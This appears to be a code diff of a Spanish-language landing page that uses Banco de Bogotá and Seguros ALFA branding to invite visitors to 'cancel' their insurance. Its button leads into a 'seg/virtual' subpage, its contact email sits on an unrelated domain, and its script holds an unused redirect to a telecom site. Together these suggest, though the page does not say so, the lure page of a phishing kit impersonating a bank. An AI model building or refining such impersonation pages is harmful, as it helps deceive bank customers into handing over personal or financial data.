@@ -25,6 +25,7 @@
          background:var(--bg); color:var(--text); -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;}
     img{max-width:100%;height:auto}
 
+    /* Header */
     #cabecera{position:fixed; inset:0 auto auto 0; width:100%; z-index:1000;
       background:rgba(255,255,255,.85); backdrop-filter:saturate(150%) blur(6px);
       border-bottom:1px solid rgba(0,0,0,.04); box-shadow:0 2px 10px rgba(0,0,0,.04);
@@ -59,10 +60,11 @@
     .titulo-registro{padding:18px 18px 0; text-align:left; font-weight:800; font-size:18px}
     .descripcion-registro{padding:12px 18px 22px; font-size:15px; color:var(--muted); text-align:left}
 
+    /* AYUDA + CONTACTO (ajuste para que no se vea “pegado”) */
     #ayuda{background:linear-gradient(180deg,#fff 0%, #fff 60%, rgba(2,8,20,.02) 100%);
       padding:clamp(28px,5vw,48px) 0 clamp(72px,8vw,110px); text-align:center;}
     #seccion-contacto{padding:0}
-    #contacto{position:relative; margin:-58px auto 0; background:#fff; border-radius:var(--radius);
+    #contacto,#contacto-mob{position:relative; margin:-58px auto 0; background:#fff; border-radius:var(--radius);
       box-shadow:0 20px 40px rgba(2,8,20,.06); width:90%; padding:clamp(22px,6vw,48px) 0;}
     .tipo-contacto{font-size:15px; font-weight:800}
     .info-contacto{font-size:14px; color:var(--muted)}
@@ -71,11 +73,22 @@
     #tbl-footer,#tbl-footer2{margin:0 auto; width:90%; max-width:980px}
     #tbl-footer img,#tbl-footer2 img{display:block; margin:0 auto}
 
-    @media (max-width:768px){
-      #tbl-baner, #tbl-azul, #contacto table, #tbl-footer, #tbl-footer2,
-      #tbl-baner td, #tbl-azul td, #contacto td{display:block; width:100%!important; text-align:center}
-      #contacto td[width="1%"]{display:none!important}
+    @media (max-width:1098px){#carr-servicios2{display:initial} #carr-servicios{display:none}}
+    @media (max-width:1023px){
+      .quitar1{display:none} #banner-mob{margin:20px; text-align:center; display:block}
+      #tbl-baner{text-align:center} .registro{max-width:380px}
     }
+    @media (max-width:768px){
+      #tbl-baner, #tbl-baner tr, #tbl-baner td,
+      #tbl-azul, #tbl-azul tr, #tbl-azul td,
+      #tbl-registro, #tbl-registro tr, #tbl-registro td,
+      #contacto table, #contacto tr, #contacto td{display:block; width:100%!important; text-align:center}
+      #contacto td[width="1%"]{display:none!important}
+      #tbl-baner td{padding:10px 0}
+      .lado-der > div{max-height:none}
+      #ayuda{padding:24px 0 56px} #contacto{margin:-36px auto 0}
+    }
+    @media (max-width:716px){.lado-der{display:none}}
 
     a{color:inherit}
     a:focus-visible{outline:3px solid #a0f0ff; outline-offset:3px; border-radius:8px}
@@ -88,10 +101,14 @@
 
 <body>
   <header id="cabecera" role="banner" aria-label="Cabecera">
-    <table id="menu-bar" aria-label="Barra de marca">
+    <table border="0" cellpadding="0" cellspacing="0" id="menu-bar" aria-label="Barra de marca">
       <tr>
-        <td><img src="seg/virtual/img/logo.svg" width="230" height="48" alt="Banco de Bogotá" /></td>
-        <td align="right"><img src="seg/virtual/img/alfa2.png" style="width:200px" alt="Seguros ALFA" /></td>
+        <td valign="middle" align="left">
+          <img src="seg/virtual/img/logo.svg" width="230" height="48" alt="Banco de Bogotá" loading="eager" fetchpriority="high" />
+        </td>
+        <td valign="middle" align="right">
+          <img src="seg/virtual/img/alfa2.png" style="width:200px" alt="Seguros ALFA" loading="eager" />
+        </td>
       </tr>
     </table>
   </header>
@@ -99,13 +116,172 @@
   <main>
     <br><br><br><br>
 
+    <!-- HERO -->
     <table id="tbl-baner" class="fade-in">
       <tr>
-        <td>
+        <td valign="middle">
           <div class="titulo-baner">Inicia el proceso de cancelación de seguros <strong>ALFA</strong></div>
           <br />
           <div class="contenido">
             Accede a los servicios que Banco de Bogotá y Seguros ALFA te ofrecen para tu seguridad y tranquilidad.
-            <br><br>
-            Disfruta todos los <strong>beneficios adicionales</strong> a tus coberturas y dale seguridad a tu desarrollo <strong>personal y profesional</strong>.
-         
+            <br /><br />
+            Disfruta todos los <strong>beneficios adicionales</strong> a tus coberturas y dale seguridad a tu
+            desarrollo <strong>personal y profesional</strong>.
+          </div>
+          <br />
+          <button class="btn" id="btn-cancelar" aria-label="Cancelar seguro">CANCELAR SEGURO</button>
+        </td>
+        <td valign="middle" class="quitar1"></td>
+      </tr>
+    </table>
+
+    <div id="banner-mob"></div>
+
+    <div style="text-align:center">
+      <a href="#seccion-azul" class="hint" aria-label="Conoce más sobre los servicios">
+        <img src="seg/virtual/img/flecha-abajo.jpg" alt="" width="22" height="22" loading="lazy" />
+        Conoce más
+      </a>
+    </div>
+
+    <!-- SECCIÓN AZUL -->
+    <br />
+    <section id="seccion-azul" aria-label="Servicios">
+      <table id="tbl-azul">
+        <tr>
+          <td class="lado-izq" width="50%" style="padding:0 30px">
+            <div class="titulo-baner">Servicios diseñados exclusivamente para ti</div>
+            <br />
+            <div class="contenido">Conoce y disfruta el Ecosistema digital de tu seguro. Servicios personalizados que se habilitan de acuerdo con las coberturas de tu producto.</div>
+          </td>
+          <td class="lado-der" width="50%" style="overflow-x:hidden!important">
+            <div>
+              <!-- RUTA CORREGIDA -->
+              <img src="seg/virtual/img/servicios2.jpg" id="carr-servicios" alt="Ilustración de servicios disponibles" width="900" height="600" decoding="async" loading="lazy" />
+              <img src="seg/virtual/img/personita.jpg" id="carr-servicios2" alt="Ícono de atención personalizada" style="width:390px" width="390" height="390" decoding="async" loading="lazy" />
+            </div>
+          </td>
+        </tr>
+      </table>
+    </section>
+
+    <!-- REGISTRO -->
+    <section id="seccion-registro" aria-label="Requisitos para registrarte">
+      <div class="titulo">¿Qué debo tener en cuenta para registrarme?</div>
+      <br /><br />
+      <div id="registro-mob" class="fade-in">
+        <div class="registro" style="border-bottom:3px solid #A375C9">
+          <img src="seg/virtual/img/segurosdevida.jpg" width="1200" height="800" alt="Seguro activo" loading="lazy" />
+          <div class="titulo-registro">Tener activo tu seguro</div>
+          <div class="descripcion-registro">Para acceder a los servicios digitales debes tener un seguro activo.</div>
+        </div>
+        <br />
+        <div class="registro" style="border-bottom:3px solid #FFC476">
+          <img src="seg/virtual/img/segurodatos.jpg" width="400" height="400" alt="Registro de datos" loading="lazy" />
+          <div class="titulo-registro">Registra tus datos</div>
+          <div class="descripcion-registro">Haz clic en “Regístrate” y diligencia un sencillo formulario con tus datos personales.</div>
+        </div>
+        <br />
+        <div class="registro" style="border-bottom:3px solid #FF91A1">
+          <img src="seg/virtual/img/beneficios.webp" width="1200" height="800" alt="Beneficios del seguro" loading="lazy" />
+          <div class="titulo-registro">Utiliza tus beneficios</div>
+          <div class="descripcion-registro">Accede a beneficios y servicios según tus coberturas.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- AYUDA -->
+    <section id="ayuda" aria-label="Ayuda y soporte">
+      <div class="titulo">¿Necesitas ayuda?</div>
+      <br />
+      <div style="text-align:center" class="contenido">
+        Recibe una consultoría completa sobre los beneficios de tu portafolio de servicios. Elige alguna de las siguientes opciones:
+      </div>
+    </section>
+
+    <!-- CONTACTO -->
+    <section id="seccion-contacto" aria-label="Medios de contacto">
+      <div id="contacto" class="quitar1 fade-in">
+        <table width="100%" cellpadding="0" cellspacing="0" border="0" aria-label="Opciones de contacto">
+          <tr>
+            <td align="center" valign="middle" width="32%">
+              <!-- RUTAS CORREGIDAS -->
+              <img src="seg/virtual/img/ico3.jpg" alt="" width="72" height="72" loading="lazy" /><br />
+              <div class="tipo-contacto">Resuelve tus dudas</div><br />
+              <div class="info-contacto">Visita nuestras preguntas frecuentes</div>
+            </td>
+            <td width="1%"><div style="border-left:1px solid #eceff3; height:120px"></div></td>
+            <td align="center" valign="middle" width="32%">
+              <img src="seg/virtual/img/ico1.jpg" alt="" width="72" height="72" loading="lazy" /><br />
+              <div class="tipo-contacto">Líneas de atención</div><br />
+              <div class="info-contacto">Bogotá: 601 7455553 · Línea nacional: 01 8000 960 011</div>
+            </td>
+            <td width="1%"><div style="border-left:1px solid #eceff3; height:120px"></div></td>
+            <td align="center" valign="middle" width="32%">
+              <img src="seg/virtual/img/ico2.jpg" alt="" width="72" height="72" loading="lazy" /><br />
+              <div class="tipo-contacto">Correo electrónico</div><br />
+              <div class="info-contacto">comunicaciones@disfrutatuseguro.com</div>
+            </td>
+          </tr>
+        </table>
+      </div>
+
+      <!-- <div id="contacto-mob" class="mostrar1"></div> -->
+    </section>
+  </main>
+
+  <footer role="contentinfo" aria-label="Pie de página">
+    <table id="tbl-footer">
+      <tr>
+        <td valign="middle" align="center" colspan="2">
+          <img src="seg/virtual/img/logo.svg" alt="Banco de Bogotá" style="max-width:250px; height:auto" loading="lazy" />
+        </td>
+      </tr>
+    </table>
+    <div id="texto-footer" class="contenido" style="width:80%; margin:0 auto; text-align:center">
+      Grupo Aval asume exclusivamente la responsabilidad del cumplimiento de las obligaciones del producto frente al consumidor
+      financiero. Este producto es ofrecido por Seguros ALFA y Grupo Aval, limitándose única y exclusivamente al correcto
+      cumplimiento de las instrucciones debidamente impartidas por Redeban para la prestación del servicio en dicha red.
+      <br /><br />
+      En caso de requerir información adicional o presentar algún inconveniente, comunícate con nuestras líneas de atención:
+    </div>
+    <br />
+    <table id="tbl-footer2" border="0">
+      <tr>
+        <td valign="top" align="center" colspan="2">
+          <!-- RUTA CORREGIDA -->
+          <img src="seg/virtual/img/favicon.ico" alt="" width="20" height="20" loading="lazy" />
+          <div style="font-weight:700; margin-top:6px">
+            Bogotá: (601) 7455553 | Cali: (2) 4850809 | Medellín: (4) 6040027 |
+            Barranquilla: (5) 3851828 | Bucaramanga: (7) 6971129 | A nivel nacional: 01 8000 960 011
+          </div>
+        </td>
+      </tr>
+    </table>
+  </footer>
+
+  <script>
+    // Redirección CTA (se conserva por compatibilidad)
+    function final(){ window.location.href = "https://www.movistar.com.co/"; }
+
+    document.addEventListener("DOMContentLoaded", function(){
+      // CTA principal
+      $("#btn-registrate,#btn-cancelar").on("click", function(){
+        window.location.href = "seg/virtual/index.html";
+      });
+
+      // Reveal animado
+      const io = new IntersectionObserver((entries) => {
+        entries.forEach(e => { if(e.isIntersecting) e.target.classList.add("is-visible"); });
+      }, {threshold:.18});
+      document.querySelectorAll(".fade-in").forEach(el => io.observe(el));
+
+      // Fallback universal de imágenes (por si alguna ruta no existe)
+      const FALLBACK = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="420" height="280"><rect width="100%" height="100%" fill="%23f2f4f7"/><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial" font-size="14" fill="%239aa4b2">Imagen no disponible</text></svg>';
+      document.querySelectorAll("img").forEach(img=>{
+        img.addEventListener("error", ()=>{ img.src = FALLBACK; img.style.background="#f7f7f9"; img.style.objectFit="contain"; });
+      });
+    });
+  </script>
+</body>
+</html>
